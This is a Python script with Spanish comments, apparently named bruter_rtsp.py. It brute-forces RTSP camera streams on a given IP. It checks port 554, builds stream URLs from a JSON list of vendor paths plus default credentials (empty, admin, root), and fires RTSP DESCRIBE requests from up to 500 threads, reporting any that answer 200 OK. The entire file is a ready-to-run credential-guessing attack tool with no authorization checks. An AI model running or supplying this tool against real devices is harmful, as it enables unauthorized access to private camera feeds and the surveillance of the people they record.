import json
import sys
import socket
import os
import subprocess
import threading
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed

# Timeout único para todas las conexiones (segundos)
SOCKET_TIMEOUT = 2
MAX_WORKERS = 500
PRECHECK_TIMEOUT = 3  # timeout para ping y puerto 554 al inicio

lock = threading.Lock()
result_rtsp = []
urls_tested = 0  # contador para progreso
stop_requested = False  # True cuando se encuentra al menos un RTSP válido


def _ping(host):
    """Intenta hacer ping al host. Devuelve True si responde."""
    try:
        if os.name == "nt":
            cmd = ["ping", "-n", "1", "-w", str(PRECHECK_TIMEOUT * 1000), host]
        else:
            cmd = ["ping", "-c", "1", "-W", str(PRECHECK_TIMEOUT), host]
        with open(os.devnull, "wb") as devnull:
            r = subprocess.run(cmd, stdout=devnull, stderr=devnull, timeout=PRECHECK_TIMEOUT + 2)
        return r.returncode == 0
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        return False


def check_host(host):
    """
    Comprueba si el host está accesible: primero puerto 554, luego ping para mensajes.
    Retorna (ok: bool, mensaje: str). Si ok es True, se puede continuar con el brute.
    """
    try:
        with socket.create_connection((host, 554), timeout=PRECHECK_TIMEOUT) as s:
            s.close()
        return True, "Puerto 554 abierto, host accesible."
    except (socket.error, OSError):
        pass
    # Puerto 554 cerrado o host inalcanzable
    if _ping(host):
        return False, "Host responde al ping pero el puerto 554 está cerrado o filtrado."
    return False, "Host no responde al ping (posiblemente offline). Comprueba la IP."


def load_rtsp_paths():
    """Carga todos los paths RTSP de datos.json en una tupla sin repeticiones."""
    with open("datos.json", "r", encoding="utf-8") as f:
        data = json.load(f)
    paths_set = set()
    for detalles in data.get("marca", {}).values():
        if "rtsp" in detalles:
            for path in detalles["rtsp"]:
                paths_set.add(path)
    return tuple(paths_set)


def is_working(url):
    """Test RTSP: conecta al puerto 554, envía DESCRIBE y comprueba si responde 200 OK con SDP."""
    global stop_requested
    try:
        urlparsed = url.split("://")
        host = urlparsed[1].split(":")[0]
        port = 554

        with socket.create_connection((host, port), SOCKET_TIMEOUT) as socket_obj:
            socket_obj.settimeout(SOCKET_TIMEOUT)
            headers = [
                f"DESCRIBE {url} RTSP/1.0",
                "User-Agent: WMPlayer/12.00.7600.16385 guid/3300AD50-2C39-46C0-AE0A-39E48EB3C868",
                "Accept: application/sdp",
                "Accept-Charset: UTF-8, *;q=0.1",
                "X-Accept-Authentication: Negotiate, NTLM, Digest",
                "Accept-Language: en-US, *;q=0.1",
                "CSeq: 1",
            ]
            header_string = "\r\n".join(headers) + "\r\n\r\n"
            socket_obj.sendall(header_string.encode())
            response = socket_obj.recv(2048)

            if b"RTSP/1.0 200 OK" in response:
                if len(response) > 132:
                    with lock:
                        result_rtsp.append(url)
                        stop_requested = True
    except (socket.error, OSError, IndexError):
        pass


def enroll(ip):
    """Genera URLs únicas y las encola en url_deque. Retorna (deque, num_paths_únicos)."""
    rtsp_paths = load_rtsp_paths()
    user = ["", "admin", "root"]
    password = ["", "admin", "root"]
    channels = [1]

    combinations = set()
    for i in user:
        for j in password:
            for k in channels:
                combinations.add(f"{i}:{j}:{k}")

    url_deque = deque()
    placeholders = ("[USERNAME]", "[CHANNEL]", "[PASSWORD]")

    for path in rtsp_paths:
        for combination in combinations:
            parts = combination.split(":")
            username, passwd, channel = parts[0], parts[1], parts[2]
            has_placeholders = any(p in path for p in placeholders)
            if not has_placeholders:
                url = f"rtsp://{username}:{passwd}@{ip}:554{path}"
            else:
                url = (
                    f"rtsp://{ip}:554{path}"
                    .replace("[PASSWORD]", passwd)
                    .replace("[USERNAME]", username)
                    .replace("[CHANNEL]", str(channel))
                )
            url_deque.append(url)

    return url_deque, len(rtsp_paths)


def worker(url_deque, total, progress_interval=500):
    """Consume URLs de la cola y ejecuta el test RTSP (DESCRIBE) en cada una."""
    global urls_tested
    while True:
        with lock:
            if stop_requested or not url_deque:
                break
            url = url_deque.popleft()
        is_working(url)  # test RTSP: conexión 554 + DESCRIBE + comprobar 200 OK
        with lock:
            urls_tested += 1
            n = urls_tested
        if progress_interval and n % progress_interval == 0:
            print(f"    Probadas {n}/{total} URLs (test RTSP DESCRIBE)...", flush=True)


def run_brute(ip):
    global urls_tested, stop_requested
    result_rtsp.clear()
    urls_tested = 0
    stop_requested = False

    print(f"[*] Comprobando host {ip} (ping y puerto 554)...")
    ok, msg = check_host(ip)
    if not ok:
        print(f"[-] {msg}")
        print("[-] Abortando. No se probarán URLs.")
        return []
    print(f"[+] {msg}")

    url_deque, num_paths = enroll(ip)
    total = len(url_deque)
    print(f"[+] {num_paths} paths RTSP únicos, {total} URLs a probar.")
    print(f"[+] Test RTSP: DESCRIBE en puerto 554 por URL. Usando hasta {MAX_WORKERS} workers...")

    socket.setdefaulttimeout(SOCKET_TIMEOUT)
    workers = min(MAX_WORKERS, total)
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(worker, url_deque, total) for _ in range(workers)]
        for f in as_completed(futures):
            f.result()

    return list(result_rtsp)


def main():
    if len(sys.argv) < 2:
        print("Uso: python bruter_rtsp.py <IP>")
        sys.exit(1)

    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

    ip = sys.argv[1]
    rtsp_works = run_brute(ip)

    if rtsp_works:
        print(f"\n[+] Encontrado al menos un RTSP válido ({len(rtsp_works)}):")
        for url in rtsp_works:
            print(f"\t- {url}")
        sys.exit(0)
    print(f"\n[-] No se encontró RTSP para {ip}")


if __name__ == "__main__":
    main()
